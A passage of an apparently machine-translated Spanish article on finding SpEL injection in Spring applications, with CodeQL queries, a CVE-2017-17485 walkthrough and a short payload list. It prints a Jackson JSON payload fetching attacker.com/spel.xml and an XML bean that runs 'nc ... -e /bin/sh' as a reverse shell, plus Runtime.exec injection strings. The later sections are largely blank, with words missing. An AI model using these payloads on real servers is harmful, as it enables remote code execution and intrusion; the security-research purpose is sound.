m.hasName(<span class="hljs-string"><span class="hljs-string">"doParseExpression"</span></span>)) and <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() = m ) } }</code> </pre> <br><p>  Ahora necesita conectar estas descripciones entre sí y hacer una selección: </p><br><pre> <code class="sql hljs">from ParseExpression expr where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr</code> </pre> <br><p>  Dicha consulta devolverá todos los métodos que comienzan con parse o con el nombre doParseExpression que pertenecerá a la clase ExpressionParser.  Pero eso es demasiado, dices, y tendrás razón.  Se requiere un filtro. </p><br><p>  Porque  en el código hay un comentario de la forma: </p><br><pre> <code class="sql hljs">* Converts a patch path to an {@link Expression}. * * @param path the patch path to convert.</code> </pre> <br><p>  Eso podría ser, por ejemplo, una búsqueda de "ruta" en Javadoc.  Spring comenta su código en una calidad muy alta, y podemos encontrar llamadas a métodos con el comentario necesario y, al mismo tiempo, eliminar todos los métodos que se incluyen en las pruebas.  Todo esto se puede describir de la siguiente manera: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">CallHasPath</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Callable</span></span></span><span class="hljs-class"> </span></span>{ CallHasPath() { not <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getDeclaringType() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> TestClass </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">and</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getDoc()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath or </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">this</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDeclaringType</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath ) } }</span></span></code> </pre> <br><p>  Luego, para combinar la clase, los métodos y el filtro por Javadoc, la consulta para la selección tomará la siguiente forma: </p><br><pre> <code class="sql hljs">from ParseExpression expr, CallHasPath c where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser and c = expr.getEnclosingCallable()) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr, c</code> </pre> <br><p>  Este ejemplo puede considerarse simple y, en general, redundante para buscar una vulnerabilidad específica.  Mucho más interesante es la búsqueda de errores al escribir una solución, porque  en él, debe especificar la clase en sí, que es responsable de la verificación, los métodos que siempre la llaman y que se ejecutan antes de ser verificados. </p><br><p>  Una llamada a un método que siempre llama a generatePath: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">VerifyPathCallerAccess</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ VerifyPathCallerAccess() { exists(VerifyPathActionConf conf | conf.callAlwaysPerformsAction(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>) ) or <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> VerifyPath } }</code> </pre> <br><p>  Una llamada a un método que se ejecuta antes de verificarPath: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UnsafeEvaluateCall</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ UnsafeEvaluateCall() { ( <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> Evaluate or </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(UnsafeEvaluateCall unsafe | </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getMethod()</span></span></span><span class="hljs-function"> </span></span>= unsafe.getEnclosingCallable() ) ) <span class="hljs-function"><span class="hljs-function">and not </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(VerifyPathCallerAccess verify | dominates(verify, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> ) } }</span></span></code> </pre> <br><p>  Considere otra vulnerabilidad interesante.  Su comprensión es muy importante, porque  muestra que el error puede estar en una biblioteca de terceros y demuestra cómo se pueden usar beans anotados en XML. </p><br><h2 id="jackson-and-bean">  Jackson y frijol </h2><br><p>  CVE-2017-17485 se basa en el uso de FileSystemXmlApplicationContext: es un contexto de aplicación independiente en forma de XML, que recibe archivos de definición de contexto del sistema de archivos o de la URL. </p><br><p>  Según la documentación, esto le permite cargar beans desde un archivo y volver a cargar el contexto de la aplicación. <br>  "... Cree un nuevo FileSystemXmlApplicationContext, cargando las definiciones de los archivos XML dados y actualizando automáticamente el contexto" </p><br><p>  Jackson es una biblioteca que le permite serializar y deserializar cualquier objeto, excepto aquellos en la lista negra.  Los atacantes suelen utilizar esta oportunidad.  En el caso de esta vulnerabilidad, el atacante tuvo que pasar el objeto <code>org.springframework.context.support.FileSystemXmlApplicationContext</code> con un valor que contiene la ruta al archivo controlado por el atacante. </p><br><p>  Es decir  en el cuerpo de la solicitud, puede pasar el siguiente JSON: </p><br><pre> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-attr"><span class="hljs-attr">"obj"</span></span>: [<span class="hljs-string"><span class="hljs-string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span></span>, <span class="hljs-string"><span class="hljs-string">"https://attacker.com/spel.xml"</span></span>]}</code> </pre> <br><p>  Spel.xml contendrá parámetros bin: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pb"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.ProcessBuilder"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value-type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.String"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>nc<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>XXXX<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>9999<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>-e<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>/bin/sh<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"whatever"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{pb.start()}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Porque  Dado que usamos la clase de bean java.lang.ProcessBuilder, que tiene un método de inicio, después de volver a cargar el contexto, Spring lee la expresión que inicia ProcessBuilder desde la propiedad SpEL, lo que obliga al servidor a conectarse a nosotros usando nc. </p><br><p>  Vale la pena prestar atención al spel.xml dado como ejemplo, como  muestra cómo pasar parámetros al ejecutar el comando. </p><br><p>  ¿Y de qué otra manera podemos cargar nuestro bean o recargar el contexto? </p><br><p>  Incluso con un vistazo rápido a la documentación de Spring, puede encontrar algunas clases más que pueden sernos útiles. </p><br><p>  ClassPathXmlApplicationContext y AbstractXmlApplicationContext son similares a FileSystem, pero los beans con anotaciones de ClassPath y XML se utilizan como la ruta a la configuración, respectivamente. </p><br><p>  Hay otro punto interesante relacionado con la recarga del contexto: @RefreshScope. </p><br><p>  Cualquier Spring Bean anotado con @RefreshScope se actualizará en el momento del lanzamiento.  Y todos los componentes que lo usan recibirán un nuevo objeto la próxima vez que se llame al método, se inicializarán completamente y se introducirán dependiendo. </p><br><p>  RefreshScope es un componente en contexto, y tiene un método público Actualizar todo diseñado para actualizar todos los componentes en un área al borrar el caché de destino.  Por lo tanto, cuando se utiliza @RefreshScope, el usuario puede acceder a una URL que termina en / refresh y, por lo tanto, volver a cargar los beans anotados. </p><br><h2 id="drugie-utility">  Otras utilidades </h2><br><p>  Hay muchos otros complementos y programas que le permiten analizar el código y encontrar la vulnerabilidad. </p><br><ul><li>  Jprofiler: se instala como una aplicación separada: servidor y complemento para IDE.  Le permite analizar una aplicación en ejecución.  Es muy conveniente analizar el comportamiento de los objetos mediante gráficos. </li></ul><br><p><img src="https://habrastorage.org/webt/g4/ki/ij/g4kiijoeylzhjo742es00a_ksti.png"></p><br><p>  De los menos - pagados, pero tiene un período libre de 10 días.  Se considera una de las mejores utilidades para analizar el comportamiento de las aplicaciones, no solo desde el punto de vista de la seguridad. </p><br><ul><li>  Xrebel - pagado, no encontramos la posibilidad de un período de prueba.  Pero también considerado uno de los mejores. </li><li>  Coverity: utiliza sus propios servidores para el análisis, por lo tanto, es conveniente solo para aquellos que no tienen miedo de diseñar su código. </li><li>  Checkmarx: muy famoso, pagado, conoce muchos idiomas y arroja muchos falsos positivos.  Pero es mejor señalar el lugar donde la teoría puede tener un error que perder un error real. </li><li>  Verificación de dependencia de OWASP: se proporciona como un complemento conveniente para varios constructores.  Logramos probarlo para Maven y Ant cuando analizamos una aplicación Java.  También es compatible con .Net.  Según los resultados del trabajo, proporciona un informe conveniente que indica bibliotecas obsoletas y vulnerabilidades conocidas por ellos. </li><li>  Findbugs: ya se mencionó anteriormente.  Tiene muchas implementaciones, pero la opción findbugs_cli resultó ser la más conveniente y, por alguna razón, mostró más problemas.  Se puede usar de la siguiente manera: <br><pre> <code class="bash hljs">findsecbugs.bat -progress -html -output report_name.htm <span class="hljs-string"><span class="hljs-string">"path\example.jar"</span></span></code> </pre> </li><li>  LGTM QL: ya se ha dado un ejemplo de su uso anteriormente.  Nos gustaría decir por separado que también hay un caso de uso pago, después del cual recibirá un servidor local para analizar su código. <br> QL    Java,             . </li></ul><br><h1 id="black-box"> Black Box </h1><br><p>  -,   . <br>  ,    : Spring,     SpEL, ,  SpEL API,   -,        . </p><br><p>         spring,      URL,    API.        /metrics  /beans —     Spring Boot Actuator     ,        . </p><br><p>  ,    . </p><br><p>    , SpEL      ,     ,    . </p><br><ul><li>  : <code>var[SpEL]=123</code> </li><li>  : <code>&amp;variable1=123&amp;SpEL=</code> </li><li> : org.springframework.cookie = <code>${}</code> </li><li>     .. </li></ul><br><h2 id="vot-nebolshaya-podborka-s-variantami-peylodov">      : </h2><br><pre> <code class="javascript hljs">${<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-number"><span class="hljs-number">3</span></span>} T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">"nslookup !url!"</span></span>) #<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getClass().forName(<span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span>).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> java.lang.ProcessBuilder({<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>}).start() ${user.name}</code> </pre> <br><h1 id="ne-spelom-ediny">  SpEL  </h1><br><p>    SpEL    ,   ,     EL Injection.    : OGNL, MVEL, JBoss EL, JSP EL.   -        . </p><br><h1 id="v-kachestve-zaklyucheniya">    </h1><br><p>  ZeroNights  : “ ,  Spring,   SpEL injection?” </p><br><p>   ,    CVE,   .       ,     ,   github. </p><br><p>  ,   ,            SpEL Expression.  Es decir  (,   )        ,      . </p><br><p>  Es decir            .      ,          ,       “” . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es433034/">https://habr.com/ru/post/es433034/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es433014/index.html">Chistes sobre el reciente lanzamiento de astronautas al espacio exterior</a></li>
<li><a href="../es433016/index.html">Cambios en la interfaz, animación en capas y caos visual estructurado: una revisión de las tendencias web para 2019</a></li>
<li><a href="../es433018/index.html">UDB Que es esto Parte 2. Ruta de datos</a></li>
<li><a href="../es433030/index.html">Live: rendimiento front-end</a></li>
<li><a href="../es433032/index.html">Cómo funciona el enrutamiento médico: contamos el ejemplo de la aplicación DOC +</a></li>
<li><a href="../es433036/index.html">Consejos para organizar TI en una pequeña empresa</a></li>
<li><a href="../es433038/index.html">¿Por qué los especialistas en marketing aprenden programación?</a></li>
<li><a href="../es433042/index.html">Intel lanzará el procesador con arquitectura tridimensional Foveros en 2019</a></li>
<li><a href="../es433044/index.html">El código fuente de OpenJDK contiene demasiadas palabras malas</a></li>
<li><a href="../es433046/index.html">Toda la verdad sobre RTOS. Artículo # 25. Canales de datos: introducción y servicios básicos</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>